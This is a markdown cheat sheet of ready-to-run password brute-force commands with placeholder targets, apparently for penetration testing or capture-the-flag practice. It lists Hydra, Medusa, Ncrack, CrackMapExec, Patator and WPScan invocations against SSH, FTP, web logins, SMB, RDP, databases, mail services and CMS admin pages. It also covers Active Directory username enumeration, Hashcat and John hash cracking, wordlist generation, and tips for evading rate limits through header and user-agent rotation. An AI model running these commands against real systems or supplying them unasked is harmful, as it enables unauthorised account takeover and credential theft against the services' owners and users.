# Bruteforce

## SSH

```bash
# Hydra
hydra -l {{user}} -P /usr/share/wordlists/rockyou.txt ssh://{{machine_ip}}
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://{{machine_ip}} -t 4
hydra -l {{user}} -P passwords.txt ssh://{{machine_ip}} -s {{port}}

# Medusa
medusa -h {{machine_ip}} -u {{user}} -P /usr/share/wordlists/rockyou.txt -M ssh
medusa -h {{machine_ip}} -U users.txt -P /usr/share/wordlists/rockyou.txt -M ssh -t 4

# Ncrack
ncrack -u {{user}} -P /usr/share/wordlists/rockyou.txt ssh://{{machine_ip}}
```

## FTP

```bash
# Hydra
hydra -l {{user}} -P /usr/share/wordlists/rockyou.txt ftp://{{machine_ip}}
hydra -L users.txt -P passwords.txt ftp://{{machine_ip}}

# Medusa
medusa -h {{machine_ip}} -u {{user}} -P /usr/share/wordlists/rockyou.txt -M ftp

# Ncrack
ncrack -u {{user}} -P /usr/share/wordlists/rockyou.txt ftp://{{machine_ip}}
```

## HTTP Basic Auth

```bash
# Hydra
hydra -l {{user}} -P /usr/share/wordlists/rockyou.txt {{machine_ip}} http-get /{{path}}
hydra -L users.txt -P passwords.txt {{machine_ip}} http-get /admin

# Medusa
medusa -h {{machine_ip}} -u {{user}} -P /usr/share/wordlists/rockyou.txt -M http -m DIR:/{{path}}
```

## HTTP POST Form

```bash
# Hydra
hydra -l {{user}} -P /usr/share/wordlists/rockyou.txt {{machine_ip}} http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect" -V
hydra -L users.txt -P passwords.txt {{machine_ip}} http-post-form "/login:user=^USER^&pass=^PASS^:Invalid credentials"

# With cookies
hydra -l {{user}} -P /usr/share/wordlists/rockyou.txt {{machine_ip}} http-post-form "/login.php:username=^USER^&password=^PASS^:F=failed:H=Cookie: PHPSESSID={{session}}"
```

## SMB

```bash
# Hydra
hydra -l {{user}} -P /usr/share/wordlists/rockyou.txt smb://{{machine_ip}}
hydra -L users.txt -P passwords.txt smb://{{machine_ip}}

# CrackMapExec
crackmapexec smb {{machine_ip}} -u {{user}} -p /usr/share/wordlists/rockyou.txt
crackmapexec smb {{machine_ip}} -u users.txt -p passwords.txt --continue-on-success

# Medusa
medusa -h {{machine_ip}} -u {{user}} -P /usr/share/wordlists/rockyou.txt -M smbnt
```

## RDP

```bash
# Hydra
hydra -l {{user}} -P /usr/share/wordlists/rockyou.txt rdp://{{machine_ip}}
hydra -L users.txt -P passwords.txt rdp://{{machine_ip}}

# Crowbar
crowbar -b rdp -s {{machine_ip}}/32 -u {{user}} -C /usr/share/wordlists/rockyou.txt

# Ncrack
ncrack -u {{user}} -P /usr/share/wordlists/rockyou.txt rdp://{{machine_ip}}
```

## MySQL

```bash
# Hydra
hydra -l {{user}} -P /usr/share/wordlists/rockyou.txt mysql://{{machine_ip}}
hydra -L users.txt -P passwords.txt mysql://{{machine_ip}}

# Medusa
medusa -h {{machine_ip}} -u {{user}} -P /usr/share/wordlists/rockyou.txt -M mysql
```

## PostgreSQL

```bash
# Hydra
hydra -l {{user}} -P /usr/share/wordlists/rockyou.txt postgres://{{machine_ip}}

# Medusa
medusa -h {{machine_ip}} -u {{user}} -P /usr/share/wordlists/rockyou.txt -M postgres
```

## MSSQL

```bash
# Hydra
hydra -l {{user}} -P /usr/share/wordlists/rockyou.txt mssql://{{machine_ip}}

# CrackMapExec
crackmapexec mssql {{machine_ip}} -u {{user}} -p /usr/share/wordlists/rockyou.txt
```

## VNC

```bash
# Hydra
hydra -P /usr/share/wordlists/rockyou.txt vnc://{{machine_ip}}

# Medusa
medusa -h {{machine_ip}} -P /usr/share/wordlists/rockyou.txt -M vnc

# Ncrack
ncrack -P /usr/share/wordlists/rockyou.txt vnc://{{machine_ip}}
```

## SNMP

```bash
# Onesixtyone
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt {{machine_ip}}

# Hydra
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt {{machine_ip}} snmp
```

## WordPress

```bash
# WPScan
wpscan --url http://{{machine_ip}} -U {{user}} -P /usr/share/wordlists/rockyou.txt
wpscan --url http://{{machine_ip}} -U users.txt -P passwords.txt

# Hydra
hydra -l {{user}} -P /usr/share/wordlists/rockyou.txt {{machine_ip}} http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=incorrect"
```

## Joomla

```bash
# Hydra
hydra -l {{user}} -P /usr/share/wordlists/rockyou.txt {{machine_ip}} http-post-form "/administrator/index.php:username=^USER^&passwd=^PASS^:F=incorrect"
```

## LDAP

```bash
# Hydra
hydra -l {{user}} -P /usr/share/wordlists/rockyou.txt ldap://{{machine_ip}}

# ldapsearch brute
for pass in $(cat passwords.txt); do ldapsearch -x -H ldap://{{machine_ip}} -D "cn={{user}},dc={{domain}},dc={{tld}}" -w $pass -b "dc={{domain}},dc={{tld}}" | grep -q "result: 0 Success" && echo "[+] Password found: $pass"; done
```

## POP3

```bash
# Hydra
hydra -l {{user}} -P /usr/share/wordlists/rockyou.txt pop3://{{machine_ip}}

# Medusa
medusa -h {{machine_ip}} -u {{user}} -P /usr/share/wordlists/rockyou.txt -M pop3
```

## IMAP

```bash
# Hydra
hydra -l {{user}} -P /usr/share/wordlists/rockyou.txt imap://{{machine_ip}}

# Medusa
medusa -h {{machine_ip}} -u {{user}} -P /usr/share/wordlists/rockyou.txt -M imap
```

## SMTP

```bash
# Hydra
hydra -l {{user}} -P /usr/share/wordlists/rockyou.txt smtp://{{machine_ip}}

# smtp-user-enum
smtp-user-enum -M VRFY -U users.txt -t {{machine_ip}}
```

## Telnet

```bash
# Hydra
hydra -l {{user}} -P /usr/share/wordlists/rockyou.txt telnet://{{machine_ip}}

# Medusa
medusa -h {{machine_ip}} -u {{user}} -P /usr/share/wordlists/rockyou.txt -M telnet
```

## Custom Brute

```bash
# Patator - HTTP
patator http_fuzz url=http://{{machine_ip}}/login method=POST body='username=FILE0&password=FILE1' 0=users.txt 1=passwords.txt -x ignore:fgrep='failed'

# Patator - SSH
patator ssh_login host={{machine_ip}} user=FILE0 password=FILE1 0=users.txt 1=passwords.txt -x ignore:mesg='Authentication failed'
```

## Username Enumeration

```bash
# Kerbrute (AD)
kerbrute userenum --dc {{dc_ip}} -d {{domain}} users.txt

# enum4linux
enum4linux -U {{machine_ip}}

# rpcclient
rpcclient -U "" -N {{machine_ip}} -c "enumdomusers"

# SMB user enum
crackmapexec smb {{machine_ip}} --users

# SMTP VRFY
smtp-user-enum -M VRFY -U users.txt -t {{machine_ip}}
```

## Hash Cracking

```bash
# John
john --wordlist=/usr/share/wordlists/rockyou.txt {{hash_file}}
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt {{hash_file}}

# Hashcat
hashcat -m 0 {{hash_file}} /usr/share/wordlists/rockyou.txt         # MD5
hashcat -m 1000 {{hash_file}} /usr/share/wordlists/rockyou.txt      # NTLM
hashcat -m 1800 {{hash_file}} /usr/share/wordlists/rockyou.txt      # sha512crypt
hashcat -m 3200 {{hash_file}} /usr/share/wordlists/rockyou.txt      # bcrypt

# Identify hash
hashid {{hash}}
hash-identifier
```

## Wordlists

```bash
# Rockyou
/usr/share/wordlists/rockyou.txt

# Seclists
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
/usr/share/seclists/Passwords/darkweb2017-top10000.txt
/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt

# Generate custom wordlist
cewl http://{{machine_ip}} -d 2 -m 5 -w wordlist.txt
crunch 8 8 -t @@@@%%%% -o wordlist.txt

# Username wordlists
/usr/share/seclists/Usernames/Names/names.txt
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

## Rate Limiting Bypass

```bash
# Hydra with delays
hydra -l {{user}} -P passwords.txt ssh://{{machine_ip}} -t 1 -W 5

# Burp Intruder with Pitchfork
# Use X-Forwarded-For header rotation
# Use different User-Agents
```